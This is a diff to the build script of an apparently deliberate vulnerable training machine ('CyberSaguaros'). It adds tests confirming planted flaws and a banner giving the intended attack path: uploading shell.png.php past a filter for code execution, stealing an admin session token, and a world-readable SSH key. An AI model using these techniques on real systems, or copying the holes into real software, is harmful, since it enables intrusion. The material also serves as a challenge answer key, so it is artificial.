@@ -518,7 +518,16 @@ runcmd:
   - [ sh, -c, 'code=\$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/); [ "\$code" = "200" ] && echo "SITE_HTTP=yes" >> /etc/cybercore-bake.env || echo "SITE_HTTP=no (\$code)" >> /etc/cybercore-bake.env' ]
   - [ sh, -c, 'code=\$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/api/verify.php); [ "\$code" = "400" ] && echo "SSRF_ENDPOINT=yes" >> /etc/cybercore-bake.env || echo "SSRF_ENDPOINT=no (\$code)" >> /etc/cybercore-bake.env' ]
   - [ sh, -c, 'curl -s http://127.0.0.1/api/internal/provision.php | grep -q admin_session && echo "INTERNAL_OK=yes" >> /etc/cybercore-bake.env || echo "INTERNAL_OK=no" >> /etc/cybercore-bake.env' ]
-  - [ sh, -c, 'printf "%s" "<?php echo 92837465;" > /var/www/cybersaguaros/public/uploads/baketest.php.jpg; out=\$(curl -s http://127.0.0.1/uploads/baketest.php.jpg); rm -f /var/www/cybersaguaros/public/uploads/baketest.php.jpg; echo "\$out" | grep -q 92837465 && echo "UPLOAD_EXEC=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_EXEC=no" >> /etc/cybercore-bake.env' ]
+  # The upload chain, asserted in four parts. UPLOAD_EXEC and
+  # UPLOAD_STATIC_NOEXEC pin the SERVER config: PHP runs from the uploads
+  # directory when the name ends in .php, and does NOT run when an image
+  # extension comes last. UPLOAD_FILTER_* drive the real code path in
+  # admin/storage.php through an admin session, which is the only thing that
+  # proves the intake filter still behaves the way the challenge needs.
+  - [ sh, -c, 'printf "%s" "<?php echo 92837465;" > /var/www/cybersaguaros/public/uploads/baketest.png.php; out=\$(curl -s http://127.0.0.1/uploads/baketest.png.php); rm -f /var/www/cybersaguaros/public/uploads/baketest.png.php; echo "\$out" | grep -q 92837465 && echo "UPLOAD_EXEC=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_EXEC=no" >> /etc/cybercore-bake.env' ]
+  - [ sh, -c, 'printf "%s" "<?php echo 92837465;" > /var/www/cybersaguaros/public/uploads/baketest.php.png; out=\$(curl -s http://127.0.0.1/uploads/baketest.php.png); rm -f /var/www/cybersaguaros/public/uploads/baketest.php.png; echo "\$out" | grep -qF "<?php" && echo "UPLOAD_STATIC_NOEXEC=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_STATIC_NOEXEC=no" >> /etc/cybercore-bake.env' ]
+  - [ sh, -c, 'printf "%s" "<?php echo 92837466;" > /tmp/bt1; tok=\$(curl -s http://127.0.0.1/api/internal/provision.php | grep -o "[0-9a-f]\{48\}" | head -1); curl -s -b "admin_session=\$tok" -F "file=@/tmp/bt1;filename=baketest2.png.php" http://127.0.0.1/admin/storage.php > /dev/null; out=\$(curl -s http://127.0.0.1/uploads/baketest2.png.php); rm -f /tmp/bt1 /var/www/cybersaguaros/public/uploads/baketest2.png.php; echo "\$out" | grep -q 92837466 && echo "UPLOAD_FILTER_BYPASS=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_FILTER_BYPASS=no" >> /etc/cybercore-bake.env' ]
+  - [ sh, -c, 'printf "%s" "<?php echo 92837467;" > /tmp/bt2; tok=\$(curl -s http://127.0.0.1/api/internal/provision.php | grep -o "[0-9a-f]\{48\}" | head -1); out=\$(curl -s -b "admin_session=\$tok" -F "file=@/tmp/bt2;filename=baketest3.php" http://127.0.0.1/admin/storage.php); rm -f /tmp/bt2 /var/www/cybersaguaros/public/uploads/baketest3.php; echo "\$out" | grep -q "Only image files" && echo "UPLOAD_FILTER_BLOCKS_NAIVE=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_FILTER_BLOCKS_NAIVE=no" >> /etc/cybercore-bake.env' ]
   # Reflected XSS: prove the payload comes back RAW. grep -F is essential — the
   # payload is not a regex. If research.php still escaped the term, the body
   # would carry &lt;script&gt; and this fails.
@@ -598,13 +607,25 @@ runcmd:
   # Debian 13, which silently breaks "cp /bin/bash /tmp/rootbash" cron payloads.
   - [ sh, -c, 'echo "TMP_OPTS=\$(findmnt -no OPTIONS /tmp 2>/dev/null | tr -d " " )" >> /etc/cybercore-bake.env' ]
 
+  - [ sh, -c, 'test -e /var/www/cybersaguaros/db && echo "SQL_SRC_REMOVED=no" >> /etc/cybercore-bake.env || echo "SQL_SRC_REMOVED=yes" >> /etc/cybercore-bake.env' ]
+
   - [ sh, -c, 'echo "BAKE_COMPLETE=yes" >> /etc/cybercore-bake.env' ]
 
   # ---- Cleanup ----
+  # The marker curls above upload through the real intake path, so they
+  # leave rows in `uploads` that would list on every lane's Cloud Storage
+  # page, and provision.php mints a session token each time it is probed.
+  - [ sh, -c, 'mysql cybersaguaros -e "TRUNCATE TABLE uploads; DELETE FROM admin_sessions;" 2>/dev/null || true' ]
   # Drop the clone (token may be in its remote URL) before sealing.
   - [ sh, -c, 'rm -rf /opt/cybersaguaros-src' ]
   - [ sh, -c, 'rm -f /etc/resolv.conf; ln -s ../run/resolvconf/resolv.conf /etc/resolv.conf' ]
   - [ sh, -c, 'cp /var/log/cloud-init-output.log /etc/cybercore-cloud-init.log 2>/dev/null || true' ]
+  # Both files describe this machine in full and are readable from the
+  # portal's own service account at 0644. The host deletes them outright
+  # after verification; 0600 is the fallback for nodes where the verify
+  # step is skipped because the disk could not be mapped.
+  - [ sh, -c, 'chmod 600 /etc/cybercore-bake.env /etc/cybercore-cloud-init.log 2>/dev/null || true' ]
+  - [ sh, -c, 'truncate -s 0 /var/log/nginx/access.log /var/log/nginx/error.log 2>/dev/null || true' ]
   - [ sh, -c, 'rm -f /etc/netplan/50-cloud-init.yaml /etc/network/interfaces.d/50-cloud-init 2>/dev/null || true' ]
   - [ cloud-init, clean, --logs, --seed ]
 
@@ -698,6 +719,10 @@ else
       SSRF_EP=$(get SSRF_ENDPOINT)
       INTERNAL_OK=$(get INTERNAL_OK)
       UPLOAD_EXEC=$(get UPLOAD_EXEC)
+      UPLOAD_NOEXEC=$(get UPLOAD_STATIC_NOEXEC)
+      UPLOAD_BYPASS=$(get UPLOAD_FILTER_BYPASS)
+      UPLOAD_BLOCKS=$(get UPLOAD_FILTER_BLOCKS_NAIVE)
+      SQL_SRC_GONE=$(get SQL_SRC_REMOVED)
       XSS_REFLECT=$(get XSS_REFLECT)
       SQLI_EP=$(get SQLI_ENDPOINT)
       DEPLOY_KEY=$(get DEPLOY_KEY)
@@ -721,7 +746,11 @@ else
       echo "    site HTTP 200:        ${SITE_HTTP:-unknown}"
       echo "    SSRF endpoint:        ${SSRF_EP:-unknown}"
       echo "    internal API:         ${INTERNAL_OK:-unknown}"
-      echo "    uploads exec PHP:     ${UPLOAD_EXEC:-unknown}"
+      echo "    uploads exec .php:    ${UPLOAD_EXEC:-unknown}"
+      echo "    image ext inert:      ${UPLOAD_NOEXEC:-unknown}"
+      echo "    intake filter bypass: ${UPLOAD_BYPASS:-unknown}"
+      echo "    intake blocks .php:   ${UPLOAD_BLOCKS:-unknown}"
+      echo "    sql source removed:   ${SQL_SRC_GONE:-unknown}"
       echo "    reflected XSS:        ${XSS_REFLECT:-unknown}"
       echo "    SQLi endpoint:        ${SQLI_EP:-unknown}"
       echo "    deploy key readable:  ${DEPLOY_KEY:-unknown}"
@@ -745,7 +774,11 @@ else
       [ "$SITE_HTTP" != "yes" ]    && { echo "ERROR: portal not serving HTTP 200"; FAIL=1; }
       [ "$SSRF_EP" != "yes" ]      && { echo "ERROR: SSRF verify endpoint not responding"; FAIL=1; }
       [ "$INTERNAL_OK" != "yes" ]  && { echo "ERROR: internal provisioning API not working"; FAIL=1; }
-      [ "$UPLOAD_EXEC" != "yes" ]  && { echo "ERROR: uploads dir does not execute PHP (RCE path broken)"; FAIL=1; }
+      [ "$UPLOAD_EXEC" != "yes" ]  && { echo "ERROR: uploads dir does not execute a .php file (RCE path broken)"; FAIL=1; }
+      [ "$UPLOAD_NOEXEC" != "yes" ] && { echo "ERROR: a file ending in an image extension still executes as PHP — the server config is not the stock one this challenge expects"; FAIL=1; }
+      [ "$UPLOAD_BYPASS" != "yes" ] && { echo "ERROR: shell.png.php did not survive the Cloud Storage intake filter — the upload stage has no solution"; FAIL=1; }
+      [ "$UPLOAD_BLOCKS" != "yes" ] && { echo "ERROR: a bare shell.php was accepted by the intake filter — there is nothing left to bypass"; FAIL=1; }
+      [ "$SQL_SRC_GONE" != "yes" ] && { echo "ERROR: /var/www/cybersaguaros/db survived the bake — schema.sql and seed.sql are readable on the box"; FAIL=1; }
       [ "$XSS_REFLECT" != "yes" ]  && { echo "ERROR: /research.php?q= still escapes the payload (reflected XSS missing)"; FAIL=1; }
       [ "$SQLI_EP" != "yes" ]      && { echo "ERROR: /research.php?q= no longer surfaces a SQL error (SQLi regressed)"; FAIL=1; }
       [ "$DEPLOY_KEY" != "yes" ]   && { echo "ERROR: deploy key missing, not encrypted, or unreadable by saguarobot"; FAIL=1; }
@@ -781,6 +814,18 @@ else
       echo "Refusing to seal a broken template. VM $VMID left intact for inspection."
       exit 1
     fi
+    # Markers verified, so the marker file has done its job. It and the
+    # cloud-init transcript both enumerate what was planted on this box, and
+    # both survive into every lane clone, so drop them before sealing.
+    if mount -o remount,rw "$VERIFY_MOUNT" 2>/dev/null; then
+      rm -f "$VERIFY_MOUNT/etc/cybercore-bake.env" \
+            "$VERIFY_MOUNT/etc/cybercore-cloud-init.log"
+      sync
+      echo "==> Removed bake-time markers and cloud-init transcript from the image."
+    else
+      echo "WARNING: could not remount rw — /etc/cybercore-bake.env and"
+      echo "         /etc/cybercore-cloud-init.log stay on the image (mode 0600)."
+    fi
     umount "$VERIFY_MOUNT"
     echo "==> All bake markers OK."
   else
@@ -814,6 +859,10 @@ echo "==================================================================="
 echo "  CyberSaguaros template $VMID baked successfully"
 echo "==================================================================="
 echo "  Portal admin:   dr.wagner / arizona"
+echo "  Web RCE:        /admin/storage.php accepts any name containing an"
+echo "                    image extension -> upload shell.png.php"
+echo "                    -> http://<ip>/uploads/shell.png.php"
+echo "                    (.phtml and .phar work too; shell.php.png does not)"
 echo "  Web foothold:   saguarobot (PHP-FPM pool user) -- NO sudo by design"
 echo "  Lateral:        -> $SSH_USER via the world-readable deploy key"
 echo "                    $DEPLOY_DIR/id_rsa  (0644, RSA-PEM, passphrase)"
